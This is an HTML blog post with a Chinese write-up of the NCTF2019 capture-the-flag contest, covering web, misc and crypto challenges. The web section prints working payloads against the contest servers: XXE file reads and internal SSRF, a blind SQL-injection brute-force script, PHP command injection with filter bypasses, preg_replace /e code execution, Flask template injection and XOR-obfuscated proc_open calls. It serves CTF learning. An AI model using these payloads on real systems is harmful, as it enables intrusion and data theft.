@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>NCTF2019[Misc&amp;&amp;web] | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言NCTF2019….. WEB1.Fake XML cookbook用户名字段存在有回显xxe，payload直接打，flag在根目录下： 1234567&lt;!DOCTYPE ANY [    &lt;!ENTITY test SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;test;&lt;&#x2F;username&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NCTF2019[Misc&amp;&amp;web]">
+<meta property="og:url" content="http://yoursite.com/2019/11/29/NCTF2019-Misc-web/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言NCTF2019….. WEB1.Fake XML cookbook用户名字段存在有回显xxe，payload直接打，flag在根目录下： 1234567&lt;!DOCTYPE ANY [    &lt;!ENTITY test SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;test;&lt;&#x2F;username&amp;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/.com//1.png">
+<meta property="og:image" content="http://yoursite.com/.com//2.png">
+<meta property="og:image" content="http://yoursite.com/.com//3.png">
+<meta property="og:image" content="http://yoursite.com/.com//4.png">
+<meta property="og:image" content="http://yoursite.com/.com//5.png">
+<meta property="og:image" content="http://yoursite.com/.com//31.png">
+<meta property="og:image" content="http://yoursite.com/.com//6.png">
+<meta property="og:image" content="http://yoursite.com/.com//7.png">
+<meta property="og:image" content="http://yoursite.com/.com//8.png">
+<meta property="og:image" content="http://yoursite.com/.com//9.png">
+<meta property="og:image" content="http://yoursite.com/.com//10.png">
+<meta property="og:image" content="http://yoursite.com/.com//11.png">
+<meta property="og:image" content="http://yoursite.com/.com//12.png">
+<meta property="og:image" content="http://yoursite.com/.com//13.png">
+<meta property="og:image" content="http://yoursite.com/.com//14.png">
+<meta property="og:image" content="http://yoursite.com/.com//15.png">
+<meta property="og:image" content="http://yoursite.com/.com//16.png">
+<meta property="og:image" content="http://yoursite.com/.com//17.png">
+<meta property="og:image" content="http://yoursite.com/.com//18.png">
+<meta property="og:image" content="http://yoursite.com/.com//19.png">
+<meta property="og:image" content="http://yoursite.com/.com//20.png">
+<meta property="og:image" content="http://yoursite.com/.com//21.png">
+<meta property="og:image" content="http://yoursite.com/.com//22.png">
+<meta property="og:image" content="http://yoursite.com/.com//23.png">
+<meta property="og:image" content="http://yoursite.com/.com//26.png">
+<meta property="og:image" content="http://yoursite.com/.com//25.png">
+<meta property="og:image" content="http://yoursite.com/.com//24.png">
+<meta property="og:image" content="http://yoursite.com/.com//30.png">
+<meta property="og:image" content="http://yoursite.com/.com//27.png">
+<meta property="og:image" content="http://yoursite.com/.com//28.png">
+<meta property="og:image" content="http://yoursite.com/.com//29.png">
+<meta property="og:image" content="http://yoursite.com/.com//32.png">
+<meta property="article:published_time" content="2019-11-29T14:18:01.000Z">
+<meta property="article:modified_time" content="2019-11-29T06:25:56.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/.com//1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-NCTF2019-Misc-web" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/11/29/NCTF2019-Misc-web/" class="article-date">
+  <time datetime="2019-11-29T14:18:01.000Z" itemprop="datePublished">2019-11-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      NCTF2019[Misc&amp;&amp;web]
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>NCTF2019…..</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="1-Fake-XML-cookbook"><a href="#1-Fake-XML-cookbook" class="headerlink" title="1.Fake XML cookbook"></a>1.Fake XML cookbook</h2><p>用户名字段存在有回显xxe，payload直接打，flag在根目录下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line"></span><br><span class="line">    &lt;!ENTITY test SYSTEM <span class="string">"file:///flag"</span>&gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;test;&lt;/username&gt;&lt;password&gt;<span class="number">123</span>&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//1.png" alt="1574535490793"></p>
+<h2 id="2-True-XML-cookbook"><a href="#2-True-XML-cookbook" class="headerlink" title="2.True XML cookbook"></a>2.True XML cookbook</h2><p>再把上一题的payload打一遍，发现已经不行了，但是依旧有回显．</p>
+<p><img src="/.com//2.png" alt="1574535803233"></p>
+<p>没有找到flag的位置…..试着读源码，发现啥也都没有</p>
+<p>最后发现是使用xxe用ssrf打内网,这里有几个文件会记录内网下的ip</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/hosts，/proc/net/arp，/proc/net/fib_trie</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//3.png" alt="1574536023673"></p>
+<p>一个个试，在192.168.1.8获得flag</p>
+<p><img src="/.com//4.png" alt="1574536099610"></p>
+<h2 id="3-sqli"><a href="#3-sqli" class="headerlink" title="3.sqli"></a>3.sqli</h2><p>fuzz测试下发现被ban掉的字符有：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">, <span class="string">' " and or # - + = 空格</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里的sql注入的查询语句是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from username=<span class="string">''</span> <span class="keyword">and</span> password=<span class="string">''</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>过滤掉单引号，用反转义来闭合，但是又过滤了所有的注释符，考虑使用%00来截断末尾的单引号</p>
+<p>payload如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">123</span>\&amp;passwd=||<span class="number">1</span>;%<span class="number">00</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//5.png" alt="1574536786575"></p>
+<p>302至welcome.php，所以现在是登录失败和登录成功的差别了，要盲注．</p>
+<p>fuzz测试发现，过滤了substr(),mid(),select()</p>
+<p>截取字符串的还有right()和left()，但是逗号被过滤了，剩下一个ascii()可以利用，然后=&lt;&gt;like被过滤了，剩下regexp可以利用，而且既然过滤了select ,只能构造简单判断字段的语句．</p>
+<p>payload如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">123</span>\&amp;passwd=||<span class="number">1</span>;%<span class="number">00</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/.com//31.png" alt="1574604135406"></p>
+<p>其中69=’i’.encode(‘hex’)</p>
+<p>其中6e=’n’.encode(‘hex’)</p>
+<p>其中63=’c’.encode(‘hex’)</p>
+<p>先通过ascii手动爆破出第一位</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">123</span>\&amp;passwd=||passwd<span class="comment">/**/</span>regexp<span class="comment">/**/</span><span class="number">121</span>;%<span class="number">00</span></span><br></pre></td></tr></table></figure>
+
+<p>发现是y</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://nctf2019.x1ct34m.com:40005/index.php"</span></span><br><span class="line">string= <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_"</span></span><br><span class="line">password=<span class="string">"y"</span></span><br><span class="line">hex_password=<span class="string">"0x79"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        s = j.encode(<span class="string">'hex'</span>)</span><br><span class="line">        payload  = <span class="string">"/**/||passwd/**/regexp/**/"</span>+hex_password+s+<span class="string">";"</span>+chr(<span class="number">0</span>)</span><br><span class="line">        data = &#123;</span><br><span class="line">           <span class="string">"username"</span>:<span class="string">"123\\"</span>,</span><br><span class="line">           <span class="string">"passwd"</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"try to make"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            password = password+j</span><br><span class="line">            hex_password= hex_password+s</span><br><span class="line">            <span class="keyword">print</span> password</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//6.png" alt="1574539118753"></p>
+<p>爆出密码：you_will_never_know7788990</p>
+<p>登陆任意用户名即可获得flag</p>
+<h2 id="4-easyphp"><a href="#4-easyphp" class="headerlink" title="4.easyphp"></a>4.easyphp</h2><p>代码审计题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">highlight_file(<span class="keyword">__file__</span>); </span><br><span class="line">$string_1 = $_GET[<span class="string">'str1'</span>]; </span><br><span class="line">$string_2 = $_GET[<span class="string">'str2'</span>]; </span><br><span class="line">$cmd = $_GET[<span class="string">'q_w_q'</span>]; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//1st </span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'num'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'num'</span>]))&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'1st ok'</span>.<span class="string">"&lt;br&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'23333333'</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//2nd </span></span><br><span class="line"><span class="keyword">if</span>(is_numeric($string_1))&#123; </span><br><span class="line">    $md5_1 = md5($string_1); </span><br><span class="line">    $md5_2 = md5($string_2); </span><br><span class="line">    <span class="keyword">if</span>($md5_1 != $md5_2)&#123; </span><br><span class="line">        $a = strtr($md5_1, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>); </span><br><span class="line">        $b = strtr($md5_2, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>); </span><br><span class="line">        <span class="keyword">if</span>($a == $b)&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'2nd ok'</span>.<span class="string">"&lt;br&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"can u give me the right str???"</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no!!!!!!!!"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'is str1 numeric??????'</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//3rd </span></span><br><span class="line">$query = $_SERVER[<span class="string">'QUERY_STRING'</span>]; </span><br><span class="line"><span class="keyword">if</span> (strlen($cmd) &gt; <span class="number">8</span>)&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"too long :("</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( substr_count($query, <span class="string">'_'</span>) === <span class="number">0</span> &amp;&amp; substr_count($query, <span class="string">'%5f'</span>) === <span class="number">0</span> )&#123; </span><br><span class="line">    $arr = explode(<span class="string">' '</span>, $cmd); </span><br><span class="line">    <span class="keyword">if</span>($arr[<span class="number">0</span>] !== <span class="string">'ls'</span> || $arr[<span class="number">0</span>] !== <span class="string">'pwd'</span>)&#123; </span><br><span class="line">        <span class="keyword">if</span>(substr_count($cmd, <span class="string">'cat'</span>) === <span class="number">0</span>)&#123; </span><br><span class="line">            system($cmd); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'ban cat :) '</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'bad guy!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'nonono _ is bad'</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="number">23333333</span></span><br></pre></td></tr></table></figure>
+
+<p>第一部分：用%0a绕过preg_match()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?num=<span class="number">23333</span>%<span class="number">0</span>a</span><br></pre></td></tr></table></figure>
+
+
+
+<p>第二部分：</p>
+<p>首先$md5_1不等于$md5_2,这里可以看到$string_1是需要经过is_numeric()的检测</p>
+<p>然后$a=$b过第二层，这里考虑使用到0e的特点．</p>
+<p>所以最终的思路是，爆破一个数字，他的md5值其中除数字外只包含’cxhp’的其中一个或多个．这样在经过strtr()替换后，$a就是纯数字，再找一个符合0e特点的数字</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> hashlib.md5(s.encode(encoding=<span class="string">'UTF-8'</span>)).hexdigest()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9999999</span>):</span><br><span class="line">    flag = <span class="number">1</span></span><br><span class="line">    j = md5(str(i))</span><br><span class="line">    <span class="keyword">print</span> j + <span class="string">"   "</span>+str(i)</span><br><span class="line">    <span class="keyword">if</span> j[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">'0e'</span>:</span><br><span class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> j[<span class="number">2</span>:]:</span><br><span class="line">            <span class="keyword">if</span> z <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">"0123456789c"</span>:</span><br><span class="line">                flag = <span class="number">0</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"------------------md5("</span>+str(i)+<span class="string">")="</span>+j</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>爆破结果：2120624</p>
+<p>payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=<span class="number">23333</span>%<span class="number">0</span>a&amp;str1=<span class="number">2120624</span>&amp;str2=<span class="number">240610708</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>第三层：</p>
+<p><code>$_GET[&#39;q_w_q&#39;]</code>长度小于等于8，并且<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>检测不能包含下划线_</p>
+<p>也就是说我们不能输入<code>q_w_q</code>,</p>
+<p>参考：<a href="https://zhidao.baidu.com/question/2140448796534468708.html?qq-pf-to=pcqq.c2c" target="_blank" rel="noopener">https://zhidao.baidu.com/question/2140448796534468708.html?qq-pf-to=pcqq.c2c</a></p>
+<p>php传入变量带有点号.会被自动转化成下划线_</p>
+<p>payload1:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=<span class="number">23333</span>%<span class="number">0</span>a&amp;str1=<span class="number">2120624</span>&amp;str2=<span class="number">240610708</span>&amp;q.w.q=dir%<span class="number">20.</span>/</span><br></pre></td></tr></table></figure>
+
+<p>读目录</p>
+<p><img src="/.com//7.png" alt="1574541392345"></p>
+<p>考虑到这个参数值长度不可超过８，没有cat,使用head,并且使用通配符绕过对长度的限制</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=<span class="number">23333</span>%<span class="number">0</span>a&amp;str1=<span class="number">2120624</span>&amp;str2=<span class="number">240610708</span>&amp;q.w.q=head%<span class="number">20</span>f*</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//8.png" alt="1574541534605"></p>
+<h2 id="5-replace"><a href="#5-replace" class="headerlink" title="5.replace"></a>5.replace</h2><p>hint:使用php5.6+bootstrap进行开发</p>
+<p>参考：<a href="https://www.freebuf.com/column/182130.html" target="_blank" rel="noopener"><a href="https://www.freebuf.com/column/182130.html" target="_blank" rel="noopener">https://www.freebuf.com/column/182130.html</a></a></p>
+<p><img src="/.com//9.png" alt="1574541903202"></p>
+<p>因为在源码中直接带有/e模式，所以phpinfo()就直接执行了…</p>
+<p>过滤了单引号，用chr()代替</p>
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub=<span class="number">123</span>&amp;pat=<span class="number">123</span>&amp;rep=show_source(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">108</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>));</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="6-flask"><a href="#6-flask" class="headerlink" title="6.flask"></a>6.flask</h2><p>打开靶机，是flask写的实现加密功能的网站</p>
+<p>在md5加密和base64加密的参数中尝试ssti失败</p>
+<p>访问sha256</p>
+<p><img src="/.com//10.png" alt="1574542449015"></p>
+<p>访问/123</p>
+<p><img src="/.com//11.png" alt="1574542483885"></p>
+<p>在这里有ssti</p>
+<p>然后就直接一把梭读flag,payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().<span class="keyword">__class__</span>.__base__.__subclasses__()[<span class="number">40</span>](<span class="string">'/fla'</span>+<span class="string">'g'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//12.png" alt="1574542639098"></p>
+<h2 id="7-hackerbackdoor"><a href="#7-hackerbackdoor" class="headerlink" title="7.hackerbackdoor"></a>7.hackerbackdoor</h2><p>nctf PHP1.0的变形，加上过滤了eval，assert函数</p>
+<p>执行phpinfo：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?useful=/etc/passwd&amp;code=$a=p.h.p.i.n.f.o;$a();</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/.com//13.png" alt="1574542855552"></p>
+<p>跟inctf一样，没有禁用proc_open函数，直接按之前的做法，执行：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proc_open(<span class="string">"/readFlag&gt;/tmp/hhx"</span>,<span class="keyword">array</span>(),$z);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>直接之前的payload来打就行：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?useful=/etc/passwd&amp;code=$a=p.r.o.c.(%a0^%ff).o.p.e.n;$a((%d0^%ff).r.e.a.d.f.l.a.g.(%c1^%ff).(%d0^%ff).t.m.p.%<span class="number">20</span>(%d0^%ff).c.o.o.k.i.e,<span class="keyword">array</span>(),$z);</span><br></pre></td></tr></table></figure>
+
+<p>写flag到/tmp/cookie</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?useful=/etc/passwd&amp;code=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(%<span class="number">27</span>/tmp/cookie%<span class="number">27</span>);&amp;%ff=show_source</span><br></pre></td></tr></table></figure>
+
+<p>读/tmp/cookie</p>
+<p>NCTF{u_arrree_S0_c3refu1_aaaaaaa}</p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="1-a-good-idea"><a href="#1-a-good-idea" class="headerlink" title="1.a_good_idea"></a>1.a_good_idea</h2><p>解压文件得到两个图片</p>
+<p>然后用stegsolve用to_do.png去combine那个to.png</p>
+<p><img src="/.com//14.png" alt="img"></p>
+<h2 id="2-pip-install"><a href="#2-pip-install" class="headerlink" title="2.pip install"></a>2.pip install</h2><p>去安装这个库的时候，安装信息里有一个下载地址</p>
+<p>访问该地址，下载库文件，在setup.py里找到flag</p>
+<p><img src="/.com//15.png" alt="img"></p>
+<p><img src="/.com//16.png" alt="img"></p>
+<h2 id="3-What’s-this"><a href="#3-What’s-this" class="headerlink" title="3.What’s this"></a>3.What’s this</h2><p>看着是一道流量分析题……</p>
+<p>上传的是一个zip文件，我们保存这个zip文件</p>
+<p>然后在deepin上看zip文件是有加密……我在win7上用7z莫名其妙就打开了</p>
+<p><img src="/.com//17.png" alt="img"></p>
+<p>然后这是一个base64隐写</p>
+<p><img src="/.com//18.png" alt="img"></p>
+<p>网上找个脚本跑一下</p>
+<p><a href="https://www.jianshu.com/p/48fe4dd3e5ce" target="_blank" rel="noopener">https://www.jianshu.com/p/48fe4dd3e5ce</a></p>
+<p><img src="/.com//19.png" alt="img"></p>
+<h2 id="4-小狗的秘密"><a href="#4-小狗的秘密" class="headerlink" title="4.小狗的秘密"></a>4.小狗的秘密</h2><p>感觉都做到最后一步了，分析流量，http的数据没有逻辑可言，但是在里面发现了一个1.html</p>
+<p><img src="/.com//20.png" alt="img"></p>
+<p>这是像素坐标，把这个转成png就好了…..</p>
+<p>参考：<a href="https://github.com/ctfs/write-ups-2014/tree/master/defkthon-ctf/misc-200" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2014/tree/master/defkthon-ctf/misc-200</a></p>
+<p>网上找了个脚本，当然用GIMP也是可以的</p>
+<p><a href="https://blog.csdn.net/qq_40657585/article/details/84858709" target="_blank" rel="noopener">https://blog.csdn.net/qq_40657585/article/details/84858709</a></p>
+<p><img src="/.com//21.png" alt="img"></p>
+<p>1.html保存下来的像素点有49799个，保险起见，补一个像素点255 255 255</p>
+<p><img src="/.com//22.png" alt="img"></p>
+<p>分解49800，最正常的因子有332*150,然后脚本跑一下，就有flag图了．</p>
+<p>分解因子的链接：<a href="http://www.ecjson.com/quality/" target="_blank" rel="noopener">http://www.ecjson.com/quality/</a></p>
+<p><img src="/.com//23.png" alt="img"></p>
+<h2 id="5-键盘侠"><a href="#5-键盘侠" class="headerlink" title="5.键盘侠"></a>5.键盘侠</h2><p>JPG图片后有个压缩包，分离出来，更改后缀.docx。</p>
+<p><img src="/.com//26.png" alt="img"></p>
+<p>检查文档可以获得一串字符：</p>
+<p><img src="/.com//25.png" alt="img"></p>
+<p>PD4<del>idqQC|WjHloX&gt;)UPb8</del>ZFb8laGczAeteE</p>
+<p>试了一下午，发现原来是base85．．．</p>
+<p><img src="/.com//24.png" alt="img"></p>
+<h2 id="6-Become-a-Rockstart"><a href="#6-Become-a-Rockstart" class="headerlink" title="6.Become a Rockstart"></a>6.Become a Rockstart</h2><p>很无聊的脑洞题…..</p>
+<p><img src="/.com//30.png" alt="img"></p>
+<p>我倒着读，然后把这里面提到的几个人说的话拼起来</p>
+<p>居然就是flag….</p>
+<p>flag:NCTF{youarnicerockstar}</p>
+<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="1-Keyboard"><a href="#1-Keyboard" class="headerlink" title="1.Keyboard"></a>1.Keyboard</h2><p><img src="/.com//27.png" alt="img"></p>
+<p>考虑到这里的ooo　yyy　这些可能是某个字符，然后这样的字符串很像词频攻击</p>
+<p>在百度上找到：<a href="https://blog.csdn.net/vhkjhwbs/article/details/100775409" target="_blank" rel="noopener">https://blog.csdn.net/vhkjhwbs/article/details/100775409</a></p>
+<p>自己写一个对应表</p>
+<p><img src="/.com//28.png" alt="img"></p>
+<p>这里的yyy  eee 这样子非单个字符的字符串对应某个字符，这个字符随便写一个就好了，我这里ooo＝o,当然也可以是ooo=x等等，不和已有的单字符重复就好了．．．</p>
+<p>然后放到：<a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a></p>
+<p>跑一下就好</p>
+<p><img src="/.com//29.png" alt="img"></p>
+<p><img src="/.com//32.png" alt="img"></p>
+<p>这里我疯了，flag是：NCTF{youaresosmartthatthisisjustapieceofcake}</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/11/29/NCTF2019-Misc-web/" data-id="ck8sqr5id000gkou552y807ly" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
